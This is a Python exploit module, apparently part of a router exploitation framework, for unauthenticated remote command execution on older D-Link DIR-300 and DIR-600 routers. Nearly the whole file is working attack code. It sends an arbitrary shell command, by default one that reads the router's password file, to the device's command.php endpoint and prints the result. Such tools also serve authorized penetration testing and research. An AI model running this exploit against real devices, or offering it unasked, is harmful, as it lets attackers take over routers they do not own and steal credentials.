# Name:D-link DIR-300 and DIR-600 command execution no auth
# File:dir300_600_exec.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 23.12.2015
# Last modified: 23.12.2015
# Shodan Dork:
# Description: Command execution vulnerability for DIR-600 2.14b01 and below, DIR-300 rev B 2.13 and below.
# Based on: https://www.rapid7.com/db/modules/auxiliary/admin/http/dlink_dir_300_600_exec_noauth

import core.Exploit
import core.io

import requests
import urllib.parse
import interface.utils
from interface.messages import print_error, print_success, print_help, print_info, \
    print_warning


class Exploit(core.Exploit.RextExploit):
    """
Name:D-link DIR-300 and DIR-600 command execution no auth
File:dir300_600_exec.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 23.12.2015
Description: Command execution vulnerability for DIR-600 2.14b01 and below, DIR-300 rev B 2.13 and below.
Based on: https://www.rapid7.com/db/modules/auxiliary/admin/http/dlink_dir_300_600_exec_noauth

Options:
    Name        Description

    host        Target host address
    port        Target port
    command     Command to execute e.g. cat var/passwd
    """
    command = ""

    def __init__(self):
        self.command = "cat var/passwd"
        core.Exploit.RextExploit.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        try:
            if args[0] == "host":
                if interface.utils.validate_ipv4(args[1]):
                    self.host = args[1]
                else:
                    print_error("please provide valid IPv4 address")
            elif args[0] == "port":
                if str.isdigit(args[1]):
                    self.port = args[1]
                else:
                    print_error("port value must be integer")
            elif args[0] == "command":
                self.command = ' '.join(args[1:])
        except IndexError:
            print_error("please specify value for variable")

    def do_command(self, e):
        print_info(self.command)

    def help_command(self):
        print_help("Prints current value of command")

    def do_run(self, e):
        url = "http://%s:%s/command.php" % (self.host, self.port)

        payload = {'cmd': '%s; echo end' % self.command}
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language': 'Accept-Language: en-us,en;q=0.5',
                   'Accept-Encoding': 'gzip, deflate',
                   'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'
                   }
        try:
            print_warning("Sending exploit")
            # Requests forces URI encoding and can't be turned off
            # so we have to prepare HTTP request manually and modify it with urllib.parse.quote before sending
            request = requests.Request('POST', url, headers=headers, data=payload)
            r = request.prepare()
            # print("Before modification:", r.body)
            r.body = urllib.parse.quote('cmd=%s; echo end' % self.command, safe='/=')
            r.headers.update({'Content-Length': len(r.body)})
            # print("After modification:", r.body)
            s = requests.Session()
            response = s.send(r, timeout=15)
            s.close()
            # This won't work
            # response = requests.post(url, headers=headers, data=payload, proxies=proxies, timeout=60)
            if "end" in response.text:  # end8758 is unique tag to search for in output
                print_success("output of %s:" % self.command)
                print_success(response.text)
            else:
                print_error("could not find marker in response, exploit failed")
        except requests.Timeout:
            print_error("timeout")
        except requests.ConnectionError:
            print_error("exploit failed or you killed httpd")
Exploit()
